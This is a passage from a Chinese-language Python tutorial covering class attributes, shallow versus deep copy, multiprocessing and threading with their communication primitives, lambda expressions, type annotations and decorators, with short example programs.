class Car:    test=1    def __init__(self, v1):        self.v1 = v1car1 = Car(&quot;aa&quot;)car2 = Car(&quot;bb&quot;)print(car1.test) # 1Car.test = 2print(Car.test) # 2print(car1.test) # 2 这里访问的是car1的类属性car1.test = 3 # 这里car1新建了实例属性test，和类属性重名，后续访问car1.test就会优先访问实例属性print(car1.test) # 3 这里访问的是car1的实例属性print(Car.test) # 2 类属性没有变化del car1.test # 如果删除car1的实例属性print(car1.test) # 2 car1的类属性就显示了

总结
类的定义：通过class关键字定义类，类包含属性和方法。
实例化对象：通过类创建对象，每个对象有自己独立的属性。
**__init__**方法：初始化对象的属性，是构造函数。
继承：子类可以继承父类的属性和方法，重写或扩展父类的方法。
多态：相同方法在不同类的对象上有不同的表现。
私有属性和方法：通过双下划线（__）将属性和方法设为私有，避免外部直接访问。


拷贝Python中的拷贝在Python中，拷贝指的是复制一个对象的过程。拷贝操作常用于需要对对象进行修改时，避免直接修改原始对象。Python中有两种主要的拷贝方式：浅拷贝和深拷贝。理解这两种拷贝方式的区别对于编写高效、可靠的代码非常重要。
浅拷贝（Shallow Copy）浅拷贝是指创建一个新对象，但该对象的元素是原始对象中元素的引用（即内存地址）。这意味着，浅拷贝后的新对象与原始对象共享相同的元素。如果新对象的元素本身是可变的，修改这些元素会影响到原始对象。
浅拷贝可以通过copy模块中的copy()方法或对象的copy()方法来实现。
浅拷贝示例：
import copy# 创建一个包含列表的字典original_dict = &#123;&quot;test&quot;:1,&quot;numbers&quot;: [1, 2, 3], &quot;letters&quot;: [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]&#125;# 使用copy方法进行浅拷贝shallow_copy_dict = copy.copy(original_dict)# 修改新字典中的元素shallow_copy_dict[&quot;numbers&quot;].append(4)shallow_copy_dict[&quot;test&quot;]=2print(&quot;Original:&quot;, original_dict)print(&quot;Shallow Copy:&quot;, shallow_copy_dict)# Original: &#123;&#x27;test&#x27;: 1, &#x27;numbers&#x27;: [1, 2, 3, 4], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;# Shallow Copy: &#123;&#x27;test&#x27;: 2, &#x27;numbers&#x27;: [1, 2, 3, 4], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;

在这个例子中，shallow_copy_dict是original_dict的浅拷贝。虽然字典对象本身是被复制的，但其中的numbers和letters列表依然是共享的，因此对numbers列表的修改会影响到original_dict。
深拷贝（Deep Copy）深拷贝会创建一个新的对象，并递归地复制原始对象中的所有元素，包括嵌套的对象。深拷贝后的新对象与原始对象完全独立，任何对新对象的修改都不会影响原始对象。
深拷贝可以通过copy模块中的deepcopy()方法来实现。
深拷贝示例：
import copy# 创建一个包含列表的字典original_dict = &#123;&quot;numbers&quot;: [1, 2, 3], &quot;letters&quot;: [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]&#125;# 使用deepcopy方法进行深拷贝deep_copy_dict = copy.deepcopy(original_dict)# 修改新字典中的元素deep_copy_dict[&quot;numbers&quot;].append(4)print(&quot;Original:&quot;, original_dict)  # 输出：&#123;&#x27;numbers&#x27;: [1, 2, 3], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;print(&quot;Deep Copy:&quot;, deep_copy_dict)  # 输出：&#123;&#x27;numbers&#x27;: [1, 2, 3, 4], &#x27;letters&#x27;: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]&#125;

在这个例子中，deep_copy_dict是original_dict的深拷贝。即使numbers列表中的内容被修改，original_dict的内容保持不变，因为深拷贝创建了独立的对象。
浅拷贝与深拷贝的区别浅拷贝
浅拷贝创建一个新对象，但不会复制对象中嵌套的可变对象的内容。相反，嵌套对象的引用被复制到新对象中，导致新旧对象共享这些嵌套对象。
浅拷贝适用于只需要复制对象本身的场景，而不需要独立的嵌套对象。

深拷贝
深拷贝创建一个新对象，并递归地复制所有的嵌套对象。新对象与原始对象完全独立，修改新对象的任何部分都不会影响原始对象。
深拷贝适用于需要完全独立于原始对象的场景，尤其是当对象中包含嵌套的可变对象时。

拷贝的注意事项拷贝与对象类型在使用浅拷贝和深拷贝时，必须考虑到对象类型。例如，对于不可变类型（如整数、浮点数、字符串和元组），它们本身不受拷贝方式的影响，因为不可变对象一旦创建就无法修改，因此即使是浅拷贝，修改新对象也不会影响原始对象。
对于自定义对象的拷贝对于自定义类的对象，浅拷贝和深拷贝的行为和内建数据类型略有不同。如果类的实例包含可变对象作为属性，那么浅拷贝会导致共享这些可变属性，而深拷贝则会创建独立的副本。

多线程和多进程Python中的多进程与多线程Python的多进程和多线程是提高程序并发性的两种方式。它们都可以用来执行并行任务，但它们的实现原理和适用场景不同。理解它们的区别和使用场景对于编写高效的并发程序至关重要。
多进程（Multiprocessing）多进程是指使用多个进程来执行任务，每个进程都有自己的内存空间和资源。进程之间相互独立，互不干扰。Python的multiprocessing模块提供了创建和管理进程的功能。
多进程的特点
独立的内存空间：每个进程都有自己的内存空间，进程之间不会共享数据。
适用于CPU密集型任务：由于每个进程都独立运行，因此它们可以在多核CPU上并行执行，适合CPU密集型任务。
进程间通信（IPC）：进程间的数据传输可以通过队列、管道等方式进行，multiprocessing模块提供了这些工具。

创建多进程可以使用multiprocessing模块的Process类来创建并启动新的进程。每个进程执行一个目标函数。
import multiprocessingimport time# 定义进程执行的任务def task(name):    print(f&quot;Process &#123;name&#125; started&quot;)    time.sleep(2)    print(f&quot;Process &#123;name&#125; finished&quot;)# 创建进程if __name__ == &quot;__main__&quot;:    processes = []        # 启动多个进程    for i in range(3):        p = multiprocessing.Process(target=task, args=(i,))        processes.append(p)        p.start()        # 等待所有进程完成    for p in processes:        p.join()    print(&quot;All processes are done&quot;)

在这个示例中，创建了三个进程，每个进程执行task函数，并打印相关信息。start()方法启动进程，join()方法确保主进程等待所有子进程完成后再结束。
多进程的优势与劣势
优势：
每个进程有独立的内存空间，避免了多线程中的全局变量共享问题。
适用于CPU密集型任务，可以充分利用多核CPU。


劣势：
启动和管理进程的开销比线程大。
进程间通信比线程间通信复杂，通常需要使用队列、管道等工具。



多线程（Multithreading）多线程是指在同一进程中创建多个线程来执行任务。线程之间共享同一进程的内存空间，因此线程间的通信比进程间更为高效。
多线程的特点
共享内存空间：线程间共享数据，因此可以直接访问和修改共享数据。
适用于I&#x2F;O密集型任务：Python的GIL（全局解释器锁）使得多线程在执行计算密集型任务时不能有效并行执行，但在I&#x2F;O密集型任务（如文件读写、网络请求）中，多线程可以显著提高性能。
线程间通信：线程之间的数据共享比较简单，但需要小心竞争条件和死锁问题。

创建多线程可以使用threading模块来创建和管理线程。每个线程执行一个目标函数。
import threadingimport time# 定义线程执行的任务def task(name):    print(f&quot;Thread &#123;name&#125; started&quot;)    time.sleep(2)    print(f&quot;Thread &#123;name&#125; finished&quot;)# 创建线程if __name__ == &quot;__main__&quot;:    threads = []        # 启动多个线程    for i in range(3):        t = threading.Thread(target=task, args=(i,))        threads.append(t)        t.start()        # 等待所有线程完成    for t in threads:        t.join()    print(&quot;All threads are done&quot;)

在这个示例中，创建了三个线程，每个线程执行task函数，start()方法启动线程，join()方法确保主线程等待所有子线程完成后再结束。
多线程的优势与劣势
优势：
线程间共享内存，通信开销较小。
适用于I&#x2F;O密集型任务，能在等待I&#x2F;O操作时并发执行其他任务。


劣势：
Python的GIL限制了多线程的并行执行，尤其在CPU密集型任务中，多个线程无法真正并行执行。
线程间的共享内存需要小心处理，可能会出现竞争条件、死锁等问题。



Python中的GIL（全局解释器锁）GIL（Global Interpreter Lock）是Python解释器中的一种机制，它确保在任何时刻只有一个线程能执行Python字节码。GIL使得多线程在进行CPU密集型任务时无法实现真正的并行计算，因为即使有多个CPU核心，Python程序仍然只能在一个核心上执行字节码。
然而，GIL并不影响I&#x2F;O密集型任务。在进行文件操作、网络请求等I&#x2F;O操作时，线程会释放GIL，允许其他线程执行，从而实现并发。
选择多进程还是多线程
多进程适用于CPU密集型任务，能够充分利用多核CPU进行并行处理，避免GIL的限制。
多线程适用于I&#x2F;O密集型任务，能够有效提高程序在进行网络请求、文件操作等I&#x2F;O操作时的效率。

进程与线程的通信进程间通信（IPC）在Python中，进程间通信可以使用multiprocessing模块提供的队列、管道等工具进行。由于每个进程都有独立的内存空间，因此必须使用这些工具进行数据交换。
使用队列进行进程间通信
import multiprocessingdef worker(q):    q.put(&quot;Hello from process&quot;)if __name__ == &quot;__main__&quot;:    queue = multiprocessing.Queue()        # 创建并启动进程    p = multiprocessing.Process(target=worker, args=(queue,))    p.start()    p.join()    # 获取进程间通信的结果    print(queue.get())  # 输出：Hello from process

线程间通信线程之间可以通过共享内存（如列表、字典等）进行通信，但需要注意线程安全问题。可以使用threading模块中的锁（Lock）来确保线程安全。
使用锁进行线程间通信
import threadingdef worker(lock):    with lock:        print(&quot;Thread is working&quot;)if __name__ == &quot;__main__&quot;:    lock = threading.Lock()        threads = []        for _ in range(3):        t = threading.Thread(target=worker, args=(lock,))        threads.append(t)        t.start()        for t in threads:        t.join()

在这个示例中，使用了Lock来确保多个线程在打印时不会发生竞争条件。

进程间通信进程间通信（IPC）进程间通信（IPC, Inter-Process Communication）是指在多个进程之间交换数据和信息。由于每个进程拥有独立的内存空间，进程间的通信不像线程之间那样直接，因此需要通过特定的方式来进行数据传输。Python的multiprocessing模块提供了多种进程间通信的方法，包括队列（Queue）、管道（Pipe）、和 **共享内存（Value&#x2F;Array）**等。
队列（Queue）队列是进程间通信中最常用的方式之一。它是一个线程安全的队列，支持在多个进程之间传递数据。进程通过队列将数据放入（put()）和取出（get()），实现进程间的数据传输。
import multiprocessingimport timedef worker(q):    time.sleep(2)    q.put(&quot;Hello from the process!&quot;)if __name__ == &quot;__main__&quot;:    # 创建队列    queue = multiprocessing.Queue()    # 创建进程并启动    process = multiprocessing.Process(target=worker, args=(queue,))    process.start()    # 等待进程完成    process.join()    # 从队列中获取数据    result = queue.get()    print(result)  # 输出：Hello from the process!

在上述代码中，queue.put()将数据放入队列，queue.get()从队列中读取数据。队列的一个重要特点是它是线程安全的，可以在多个进程间安全地传递数据。
管道（Pipe）管道是另一种简单的进程间通信机制，适用于两个进程之间的数据传输。管道提供了两端，一端写入数据，另一端读取数据。管道适用于数据量较小或两个进程之间的简单通信。
import multiprocessingimport timedef worker(pipe):    time.sleep(2)    pipe.send(&quot;Hello from the process!&quot;)  # 向管道发送数据    pipe.close()if __name__ == &quot;__main__&quot;:    # 创建管道    parent_conn, child_conn = multiprocessing.Pipe()    # 创建进程并启动    process = multiprocessing.Process(target=worker, args=(child_conn,))    process.start()    # 从管道接收数据    result = parent_conn.recv()    print(result)  # 输出：Hello from the process!    # 等待进程完成    process.join()

在这个例子中，Pipe()创建了一个管道，parent_conn和child_conn分别代表管道的两端。进程通过child_conn.send()将数据发送到管道，主进程通过parent_conn.recv()接收数据。
共享内存（Value&#x2F;Array）共享内存是另一种进程间通信的方式，允许多个进程访问同一内存区域。Value和Array是multiprocessing模块提供的共享内存对象，分别用于存储单一的值和数组。
使用Value进行共享内存通信import multiprocessingdef worker(val):    val.value += 1  # 修改共享内存中的值if __name__ == &quot;__main__&quot;:    # 创建共享内存变量    shared_value = multiprocessing.Value(&#x27;i&#x27;, 0)  # &#x27;i&#x27;表示整型    # 创建多个进程并启动    processes = []    for _ in range(5):        p = multiprocessing.Process(target=worker, args=(shared_value,))        processes.append(p)        p.start()    # 等待进程完成    for p in processes:        p.join()    print(f&quot;Shared value: &#123;shared_value.value&#125;&quot;)  # 输出：Shared value: 5

在此示例中，shared_value是一个共享内存变量，多个进程都能访问并修改它的值。multiprocessing.Value创建了一个共享的整型变量。
使用Array进行共享内存通信import multiprocessingdef worker(arr):    arr[0] += 1  # 修改共享数组中的元素if __name__ == &quot;__main__&quot;:    # 创建共享内存数组    shared_array = multiprocessing.Array(&#x27;i&#x27;, [0, 0, 0])  # &#x27;i&#x27;表示整型数组    # 创建多个进程并启动    processes = []    for _ in range(5):        p = multiprocessing.Process(target=worker, args=(shared_array,))        processes.append(p)        p.start()    # 等待进程完成    for p in processes:        p.join()    print(f&quot;Shared array: &#123;list(shared_array)&#125;&quot;)  # 输出：Shared array: [5, 0, 0]

在这个例子中，shared_array是一个共享的整数数组，多个进程并发地修改数组的内容。multiprocessing.Array提供了一个共享内存数组，进程间可以直接修改它的元素。
进程间通信的同步在进程间共享内存时，由于多个进程可能同时修改共享数据，因此需要使用同步机制，防止数据竞争或出现不一致的情况。multiprocessing模块提供了多种同步工具，例如Lock、Semaphore等。
使用Lock同步进程import multiprocessingdef worker(lock, shared_value):    with lock:        shared_value.value += 1  # 确保对共享值的访问是互斥的if __name__ == &quot;__main__&quot;:    lock = multiprocessing.Lock()    shared_value = multiprocessing.Value(&#x27;i&#x27;, 0)    processes = []    for _ in range(5):        p = multiprocessing.Process(target=worker, args=(lock, shared_value))        processes.append(p)        p.start()    for p in processes:        p.join()    print(f&quot;Shared value: &#123;shared_value.value&#125;&quot;)

在此示例中，Lock用于确保每次只有一个进程能够访问共享资源shared_value。通过with lock确保每个进程在修改共享数据时是互斥的，避免数据竞争。

线程间通信线程间通信（Inter-Thread Communication）指的是在多个线程之间传递数据和信息。不同于进程间通信，线程是共享同一进程的内存空间，因此它们可以直接访问共享的资源和数据。线程间通信相对简单，但也需要小心数据竞争和线程同步问题。Python通过threading模块提供了多种线程间通信的方式，包括共享内存、队列（Queue）、以及**事件（Event）**等。
共享内存由于所有线程都共享进程的内存空间，它们可以直接访问全局变量或共享对象。这种方式适合一些简单的场景，但需要注意线程间的同步问题。
import threading# 共享变量shared_value = 0def worker():    global shared_value    for _ in range(5):        shared_value += 1        print(f&quot;Thread updated shared_value: &#123;shared_value&#125;&quot;)if __name__ == &quot;__main__&quot;:    threads = []        # 启动多个线程    for _ in range(3):        t = threading.Thread(target=worker)        threads.append(t)        t.start()    for t in threads:        t.join()    print(f&quot;Final shared_value: &#123;shared_value&#125;&quot;)

在上面的示例中，shared_value是多个线程共享的变量。所有线程都可以直接访问并修改它。由于线程之间是并发执行的，在没有同步机制的情况下，可能会导致数据竞争问题，即多个线程同时修改共享变量，导致结果不一致。
队列（Queue）queue.Queue是线程安全的，可以在多个线程之间传递数据。通过put()和get()方法，线程可以将数据放入队列或者从队列中取出数据。Queue实现了生产者-消费者模式，适用于多个线程之间传递数据。
import threadingimport queueimport timedef producer(q):    for i in range(5):        time.sleep(1)        q.put(i)        print(f&quot;Produced: &#123;i&#125;&quot;)def consumer(q):    while True:        item = q.get()        if item is None:  # 结束标志            break        print(f&quot;Consumed: &#123;item&#125;&quot;)if __name__ == &quot;__main__&quot;:    q = queue.Queue()    # 启动生产者和消费者线程    producer_thread = threading.Thread(target=producer, args=(q,))    consumer_thread = threading.Thread(target=consumer, args=(q,))    producer_thread.start()    consumer_thread.start()    producer_thread.join()        # 向队列中添加None作为结束标志    q.put(None)        consumer_thread.join()    print(&quot;All tasks are completed.&quot;)

在这个例子中，producer线程将数据放入队列，而consumer线程从队列中获取数据并进行处理。为了结束consumer线程，我们向队列中放入了None，作为一个结束信号。使用队列可以避免多线程间共享内存的复杂性，并且queue.Queue本身是线程安全的。
事件（Event）threading.Event是一个简单的同步原语，用于线程之间的信号传递。一个线程可以设置事件状态为“已触发”，其他线程可以等待事件被触发。
import threadingimport timedef wait_for_event(e):    print(&quot;Thread is waiting for the event to be set.&quot;)    e.wait()  # 阻塞，直到事件被触发    print(&quot;Event is set! Thread is resuming.&quot;)def trigger_event(e):    time.sleep(2)    print(&quot;Setting event...&quot;)    e.set()  # 设置事件if __name__ == &quot;__main__&quot;:    event = threading.Event()    # 启动等待事件的线程    thread1 = threading.Thread(target=wait_for_event, args=(event,))    # 启动触发事件的线程    thread2 = threading.Thread(target=trigger_event, args=(event,))    thread1.start()    thread2.start()    thread1.join()    thread2.join()    print(&quot;All tasks are completed.&quot;)

在这个例子中，wait_for_event线程在调用e.wait()时会被阻塞，直到trigger_event线程调用e.set()来触发事件。Event用于在一个线程中设置某种条件，然后其他线程等待这个条件的发生。
锁（Lock）Lock用于确保只有一个线程能够访问共享资源。
import threadinglock = threading.Lock()def worker():    with lock:        # 临界区：只有一个线程能在这里执行        print(f&quot;&#123;threading.current_thread().name&#125; is working.&quot;)if __name__ == &quot;__main__&quot;:    threads = []        for _ in range(3):        t = threading.Thread(target=worker)        threads.append(t)        t.start()    for t in threads:        t.join()    print(&quot;All threads have finished.&quot;)

在这个例子中，Lock用于同步多个线程的访问。通过with lock语句确保只有一个线程能进入临界区执行操作，避免多个线程同时修改共享资源。
条件（Condition）Condition允许线程在特定条件下等待和通知其他线程。
import threadingcondition = threading.Condition()def consumer():    with condition:        print(&quot;Consumer is waiting for the event.&quot;)        condition.wait()  # 等待被通知        print(&quot;Consumer is now consuming!&quot;)def producer():    with condition:        print(&quot;Producer is producing something.&quot;)        condition.notify()  # 通知等待的线程        print(&quot;Producer has notified the consumer.&quot;)if __name__ == &quot;__main__&quot;:    consumer_thread = threading.Thread(target=consumer)    producer_thread = threading.Thread(target=producer)    consumer_thread.start()    producer_thread.start()    consumer_thread.join()    producer_thread.join()    print(&quot;All tasks are completed.&quot;)

在这个示例中，consumer线程在调用condition.wait()时会被阻塞，直到producer线程调用condition.notify()来通知它继续执行。Condition提供了更复杂的同步机制，适用于需要线程间协调的场景。

lambda表达式Lambda表达式的基本语法Lambda表达式是Python中用于创建匿名函数的简洁方式。它的基本语法如下：
lambda 参数1, 参数2, ... : 表达式


lambda：是Python中用于定义匿名函数的关键字。
参数1, 参数2, ...：输入参数，可以有多个，也可以没有。
表达式：Lambda函数体，计算并返回一个值。Lambda函数只能包含一个表达式，不能有多条语句。

Lambda表达式的示例最简单的Lambda表达式add = lambda x, y: x + yprint(add(3, 5))  # 输出：8

在这个例子中，lambda x, y: x + y创建了一个匿名函数，接受两个参数x和y，并返回它们的和。通过将其赋值给add变量，之后可以调用它。
使用Lambda表达式创建简单的函数square = lambda x: x * xprint(square(4))  # 输出：16

这里的Lambda表达式用于计算一个数字的平方。
Lambda表达式的应用场景Lambda表达式非常适用于那些需要短小、简洁函数的场合，尤其是在一些高阶函数（如map()、filter()、sorted()等）中作为参数传递。
在map()函数中使用Lambdamap()函数用于将指定函数应用于给定序列的每个元素，返回一个迭代器。Lambda表达式非常适合作为map()的参数。
numbers = [1, 2, 3, 4, 5]squared_numbers = map(lambda x: x**2, numbers)print(list(squared_numbers))  # 输出：[1, 4, 9, 16, 25]

在这个例子中，lambda x: x**2是一个简单的匿名函数，用于计算每个数字的平方，map()函数应用它到numbers列表中的每个元素。
在filter()函数中使用Lambdafilter()函数用于从序列中过滤出符合条件的元素，返回一个新的迭代器。Lambda表达式可以用来定义过滤条件。
numbers = [1, 2, 3, 4, 5, 6]even_numbers = filter(lambda x: x % 2 == 0, numbers)print(list(even_numbers))  # 输出：[2, 4, 6]

这里的lambda x: x % 2 == 0是一个检查数字是否为偶数的Lambda函数，filter()函数将它应用于numbers列表，筛选出所有偶数。
在sorted()函数中使用Lambdasorted()函数用于排序序列，可以通过key参数指定排序规则。Lambda表达式常用于快速定义排序规则。
students = [(&quot;Alice&quot;, 85), (&quot;Bob&quot;, 90), (&quot;Charlie&quot;, 78)]sorted_students = sorted(students, key=lambda x: x[1])print(sorted_students)  # 输出：[(&#x27;Charlie&#x27;, 78), (&#x27;Alice&#x27;, 85), (&#x27;Bob&#x27;, 90)]

在这个例子中，lambda x: x[1]是一个用于提取每个元组中分数的Lambda函数。sorted()将这个函数应用于students列表，按照分数进行排序。
在reduce()函数中使用Lambdareduce()函数用于将一个序列中的所有元素通过指定的函数进行累积计算。Lambda表达式通常用于定义累积操作。
from functools import reducenumbers = [1, 2, 3, 4, 5]result = reduce(lambda x, y: x + y, numbers)print(result)  # 输出：15

在这个例子中，lambda x, y: x + y定义了一个累加操作的Lambda函数，reduce()将其应用于numbers列表中的元素，计算出所有元素的和。
Lambda表达式与普通函数的比较定义简洁性Lambda表达式通常比普通函数定义更简洁，适用于简单的功能。普通函数定义通常需要更多的代码。
# 普通函数def add(x, y):    return x + y# Lambda表达式add_lambda = lambda x, y: x + y

功能限制Lambda表达式只能包含一个表达式，而普通函数可以包含多个语句。对于简单的操作，Lambda表达式可以使代码更简洁，但当逻辑较复杂时，普通函数会更加清晰。
# 普通函数def multiply(x, y):    result = x * y    return result# Lambda表达式multiply_lambda = lambda x, y: x * y  # 只能包含一条表达式

可重用性普通函数通常有名称，可以在多个地方复用。Lambda表达式通常是一次性使用的匿名函数，不需要为它起名字。
# 普通函数def square(x):    return x * x# Lambda表达式square_lambda = lambda x: x * x

性能Lambda表达式的性能与普通函数相差无几。它的优势在于简洁性，对于简单的功能，Lambda表达式能让代码更紧凑。对于复杂的功能，仍然推荐使用普通函数。
Lambda表达式的优缺点优点
简洁：Lambda表达式使代码更简洁，适用于定义简单的函数。
方便：常用于需要传递函数的地方，如map()、filter()、sorted()等函数。
匿名函数：不需要为简单的函数定义名字。

缺点
功能限制：Lambda表达式只能包含一个表达式，无法包含复杂的逻辑或多条语句。
可读性差：对于复杂的操作，Lambda表达式可能使代码难以理解，应避免过度使用。

总结
Lambda表达式是Python中的匿名函数，可以简洁地定义简单的功能。
应用场景：主要用于map()、filter()、reduce()等高阶函数中，快速定义操作。
优缺点：Lambda表达式使代码更加简洁，但适用于简单任务，复杂任务仍然需要使用普通函数。


类型注解类型注解（Type Annotation）类型注解是Python的一项功能，允许开发者在代码中显式地指定函数参数和返回值的类型。类型注解本身不会影响程序的执行，它们主要用于提供额外的信息，帮助开发者理解代码的结构，同时可以通过静态类型检查工具（如mypy）来检查代码中的类型一致性。
类型注解是Python 3.5引入的特性，随着时间的发展，它逐渐成为开发人员提高代码可读性和可维护性的一项重要工具。
基本语法函数参数的类型注解在函数定义中，可以使用冒号:后跟类型来为每个参数指定类型。
def add(a: int, b: int) -&gt; int:    return a + b

在这个例子中，函数add接受两个int类型的参数，并返回一个int类型的结果。类型注解指定了a和b的类型是int，并且指定了返回值类型为int。
变量的类型注解Python也支持在变量声明时添加类型注解，虽然类型注解不会影响变量的实际行为，但它提供了对变量类型的提示。
x: int = 5y: str = &quot;Hello&quot;

这里，x被注解为int类型，y被注解为str类型。这样做有助于提高代码的可读性，尤其是在较大的项目中，明确变量类型非常重要。
复合类型注解对于更复杂的类型，可以使用Python的内建类型（如List、Dict、Tuple等）来进行注解。Python的typing模块提供了这些类型。
列表的类型注解from typing import Listdef sum_list(numbers: List[int]) -&gt; int:    return sum(numbers)

在这个例子中，numbers被注解为一个int类型的列表，表示函数接受一个int类型的列表，并返回一个int类型的结果。
字典的类型注解from typing import Dictdef get_name_age(person: Dict[str, int]) -&gt; str:    return f&quot;&#123;person[&#x27;name&#x27;]&#125; is &#123;person[&#x27;age&#x27;]&#125; years old&quot;

此例中，person被注解为一个字典，字典的键是str类型，值是int类型。
元组的类型注解from typing import Tupledef coordinates() -&gt; Tuple[int, int]:    return (10, 20)

在这个例子中，coordinates()函数返回一个包含两个int类型值的元组。
可选类型（Optional）有时，函数的参数或返回值可能是某种类型，或者是None。这种情况下，可以使用Optional来表示这种可能性。
from typing import Optionaldef find_name(names: List[str], name: str) -&gt; Optional[str]:    if name in names:        return name    return None

在这个例子中，find_name函数返回一个str类型的值，或者返回None。通过Optional[str]，我们明确了返回值的类型要么是str，要么是None。
类型别名（Type Aliases）如果你想给复杂的类型定义一个别名，可以使用TypeVar和Type。这对于提高代码可读性非常有用。
from typing import List, TuplePoint = Tuple[int, int]  # 定义类型别名def distance(p1: Point, p2: Point) -&gt; float:    return ((p1[0] - p2[0]) ** 2 + (p1[1] - p2[1]) ** 2) ** 0.5

在这个例子中，Point是Tuple[int, int]的类型别名，表示一个二维点的坐标。通过给类型创建别名，代码更简洁并且易于理解。
联合类型（Union）有时，变量或者函数的返回值可能有多种类型。可以使用Union来表示一个类型可以是多个类型之一。
from typing import Uniondef parse_value(val: Union[int, str]) -&gt; str:    return str(val)

在这个例子中，val的类型可能是int或str，通过Union[int, str]来表示这种可能性。
类型推导与静态检查尽管Python是动态类型语言，类型注解本身并不会影响程序的运行。Python的类型注解通常依赖于静态类型检查工具（如mypy）来进行验证。
示例：使用mypy进行类型检查
首先，安装mypy：

pip install mypy


然后，你可以使用mypy来检查你的代码：

mypy your_script.py

mypy将根据类型注解检查你的代码是否存在类型不匹配的错误。
类型注解的优势增强代码可读性类型注解能够清楚地表明函数和变量的类型，使代码的意图更加明确，特别是在大型项目中，帮助开发者快速理解代码。
提高代码质量类型注解可以让你在开发过程中提前发现一些潜在的类型错误。通过静态类型检查工具，开发者可以在程序运行之前发现类型不匹配的地方，避免因类型问题导致的运行时错误。
增加开发效率当函数参数和返回值的类型明确时，IDE（集成开发环境）可以提供更好的自动补全、类型提示和错误检查，帮助开发者减少错误并提高开发效率。
类型注解的限制1. 类型注解并不强制执行Python的类型注解并不会强制执行类型检查。它们仅供开发者参考，或者通过静态类型检查工具（如mypy）来验证类型一致性。Python本身在运行时并不检查类型，因此程序在运行时不会因为类型错误而抛出异常。
2. 动态类型语言的灵活性丧失虽然类型注解提高了代码的可读性和可靠性，但它也减少了Python作为动态类型语言的灵活性。开发者在定义类型时需要更加严格地遵循规范，这在某些情况下可能会限制代码的灵活性。

装饰器装饰器的概念在Python中，**装饰器（Decorator）**是一个用于修改或扩展函数或方法功能的高级特性。装饰器本质上是一个函数，它接受一个函数作为输入，并返回一个新的函数。装饰器通常用于增加函数的功能，而无需修改原有的函数代码。
装饰器的核心思想是通过将额外的功能封装到一个装饰器函数中，来“装饰”原始函数，从而实现代码的复用和功能扩展。
装饰器的基本语法装饰器是一个函数，它接受一个函数作为参数，并返回一个新的函数。在Python中，可以通过@符号来使用装饰器，语法如下：
@decoratordef function():    pass

等价于：
def function():    passfunction = decorator(function)

示例：最简单的装饰器def simple_decorator(func):    def wrapper():        print(&quot;Before function call.&quot;)        func()        print(&quot;After function call.&quot;)    return wrapper@simple_decoratordef say_hello():    print(&quot;Hello!&quot;)say_hello()

在这个例子中，simple_decorator是一个装饰器，它接受一个函数func，并返回一个新的函数wrapper。wrapper在调用func之前和之后分别打印一些内容。当我们使用@simple_decorator语法时，say_hello函数被simple_decorator装饰，调用say_hello()时实际上会执行装饰器中的wrapper函数。
输出：Before function call.Hello!After function call.

装饰器的应用装饰器常用于多种场景，主要用于增强函数或方法的功能。常见的应用场景包括：

日志记录：在函数调用前后记录日志。
权限检查：在执行函数之前检查用户权限。
缓存：缓存函数的计算结果，避免重复计算。

示例：装饰器用于日志记录def log_decorator(func):    def wrapper(*args, **kwargs):        print(f&quot;Calling function &#123;func.__name__&#125; with arguments &#123;args&#125; and &#123;kwargs&#125;&quot;)        result = func(*args, **kwargs)        print(f&quot;Function &#123;func.__name__&#125; returned &#123;result&#125;&quot;)        return result    return wrapper@log_decoratordef add(a, b):    return a + badd(2, 3)

在这个例子中，log_decorator是一个装饰器，它会在函数调用前打印函数名称、参数，以及函数执行后的返回值。装饰器@log_decorator装饰了add函数，使得每次调用add时都会执行日志记录。
输出：Calling function add with arguments (2, 3) and &#123;&#125;Function add returned 5

带参数的装饰器有时，我们希望装饰器接受一些参数来定制装饰器的行为。在这种情况下，装饰器本身需要再嵌套一层函数，以便接收参数。
示例：带参数的装饰器def repeat_decorator(times):    def decorator(func):        def wrapper(*args, **kwargs):            for _ in range(times):                result = func(*args, **kwargs)            return result        return wrapper    return decorator@repeat_decorator(times=3)def greet(name):    print(f&quot;Hello, &#123;name&#125;!&quot;)greet(&quot;Alice&quot;)

在这个例子中，repeat_decorator是一个带参数的装饰器，它接受times作为参数，并将func执行指定的次数。在这个例子中，greet(&quot;Alice&quot;)会打印三次Hello, Alice!。
输出：Hello, Alice!Hello, Alice!Hello, Alice!

装饰器与函数参数装饰器通常是为了包装原始函数，但如果函数有参数，我们也可以使用*args和**kwargs来确保装饰器适用于任何参数类型的函数。
示例：装饰器与函数参数def greet_decorator(func):    def wrapper(*args, **kwargs):        print(&quot;Before function call&quot;)        result = func(*args, **kwargs)        print(&quot;After function call&quot;)        return result    return wrapper@greet_decoratordef greet(name, age):    print(f&quot;Hello &#123;name&#125;, you are &#123;age&#125; years old.&quot;)greet(&quot;Alice&quot;, 30)

在这个例子中，greet函数接受两个参数name和age，greet_decorator装饰器通过*args和**kwargs处理这些参数。
输出：Before function callHello Alice, you are 30 years old.After function call

装饰器的嵌套使用多个装饰器可以同时应用于一个函数，装饰器按照从下到上的顺序执行。
示例：多个装饰器def decorator_1(func):    def wrapper():        print(&quot;Decorator 1&quot;)        return func()    return wrapperdef decorator_2(func):    def wrapper():        print(&quot;Decorator 2&quot;)        return func()    return wrapper@decorator_1@decorator_2def say_hello():    print(&quot;Hello!&quot;)say_hello()

在这个例子中，say_hello函数被两个装饰器装饰。装饰器的执行顺序是从下到上，因此decorator_2先执行，然后是decorator_1。
输出：Decorator 1Decorator 2Hello!

functools.wraps：保留原函数的元数据当我们使用装饰器时，原函数的一些元数据（如函数名、文档字符串等）会丢失。如果我们希望装饰器能够保留原函数的这些元数据，可以使用functools.wraps。
示例：使用functools.wrapsfrom functools import wrapsdef simple_decorator(func):    @wraps(func)    def wrapper(*args, **kwargs):        print(&quot;Before function call&quot;)        return func(*args, **kwargs)    return wrapper@simple_decoratordef say_hello():    &quot;&quot;&quot;This is a greeting function.&quot;&quot;&quot;    print(&quot;Hello!&quot;)print(say_hello.__name__)  # 输出：say_helloprint(say_hello.__doc__)   # 输出：This is a greeting function.

在这个例子中，使用了@wraps(func)来确保装饰器不会丢失原函数的__name__和__doc__等元数据。否则，装饰器会导致say_hello函数的元数据丢失。
总结
